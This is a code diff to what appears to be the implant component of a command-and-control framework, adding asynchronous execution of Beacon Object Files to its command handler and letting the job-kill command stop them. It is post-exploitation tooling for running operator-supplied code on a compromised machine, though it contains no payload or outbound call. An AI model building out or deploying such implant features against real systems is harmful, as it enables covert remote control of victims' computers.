@@ -1,5 +1,8 @@
 #include "Commander.h"
+#include "bof_loader.h"
 #include "Boffer.h"
+
+extern HANDLE g_StoredToken;
 
 void* Commander::operator new(size_t sz) 
 {
@@ -326,6 +329,7 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 
 void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
+	BOOL  async     = inPacker->Unpack8();
 	ULONG entrySize = 0;
 	BYTE* entry     = inPacker->UnpackBytes(&entrySize);
 	ULONG bofSize   = 0;
@@ -334,14 +338,38 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	BYTE* args      = inPacker->UnpackBytes(&argsSize);
 	ULONG taskId    = inPacker->Unpack32();
 
-	Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
-	if (bofPacker->datasize() > 8)
-		outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
+	if (!g_AsyncBofManager) {
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(ERROR_NOT_SUPPORTED);
+		return;
+	}
 
-	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
+	if (async) {
+		AsyncBofContext* ctx = g_AsyncBofManager->CreateAsyncBof(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
+		if (!ctx) {
+			outPacker->Pack32(COMMAND_ERROR);
+			outPacker->Pack32(ERROR_NOT_ENOUGH_MEMORY);
+			return;
+		}
+		if (!g_AsyncBofManager->StartAsyncBof(ctx)) {
+			outPacker->Pack32(COMMAND_ERROR);
+			outPacker->Pack32(TEB->LastErrorValue);
+			return;
+		}
+	}
+	else {
+		Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
+		if (bofPacker && bofPacker->datasize() > 0)
+			outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
 
-	bofPacker->Clear(TRUE);
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(commandId);
+		outPacker->Pack8(FALSE);
+
+		if (bofPacker)
+			bofPacker->Clear(TRUE);
+	}
 }
 
 void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -418,6 +446,9 @@ void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker
 			break;
 		}
 	}
+
+	if (!found && g_AsyncBofManager)
+		found = g_AsyncBofManager->StopAsyncBof(jobId);
 
 	outPacker->Pack8(found);
 	outPacker->Pack32(jobId);
